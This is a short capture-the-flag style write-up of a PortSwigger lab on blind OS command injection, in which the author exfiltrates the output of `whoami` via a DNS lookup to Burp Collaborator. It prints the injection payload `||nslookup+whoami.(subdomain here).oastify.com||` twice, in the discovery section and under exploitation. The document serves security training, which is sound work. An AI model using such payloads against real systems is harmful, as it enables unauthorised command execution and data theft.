# Blind OS Command Injection with Out-of-Band Data Exfiltration

> **Vulnerability Type:** OS Command Injection  
> **Lab URL:** [OS Command Injection Lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

---

## Objective  
Execute the `whoami` command and exfiltrate the output via a DNS request to Burp Collaborator.

---

## Setup  
- **Tools Used:** Burp Suite  
- **Environment Details:** PortSwigger Lab  

---

## Methodology  

### 1. **Discovery**  
- **Initial Observations:**  
  - The only input fields I found were on the user feedback page: Name, Email, Subject, and Message.
- **Testing Approach:**  
  - Submitted feedback and scanned the HTTP request using Burp Scanner. Identified the email, message, and subject parameters as vulnerable to OS command injection.
  - Crafted a payload to cause a DNS interaction with the output being added to the subdomain: `||nslookup+whoami.(subdomain here).oastify.com||`. Received a DNS lookup of type A for the domain name `peter-xDkhEN.(subdomain here).oastify.com`, given the answer to the lab in the subdomain of the DNS lookup `peter-xDkhEN` completing the lab upon submission.

### 2. **Exploitation**  
- **Payload Used:**  
  ```shell
  ||nslookup+whoami.(subdomain here).oastify.com||
  ```
### 3. **Screenshots**
The request causing the target to send a DNS lookup request with the desired information.
![Screenshot 2025-03-05 134832](https://github.com/user-attachments/assets/ab4272d9-96ac-4b94-a4fc-eb3b9a23ed0c)
Burp Collaborator showing the DNS lookup.
![Screenshot 2025-03-05 134820](https://github.com/user-attachments/assets/1e69b813-47d1-44af-be45-1ceec9bce7ad)
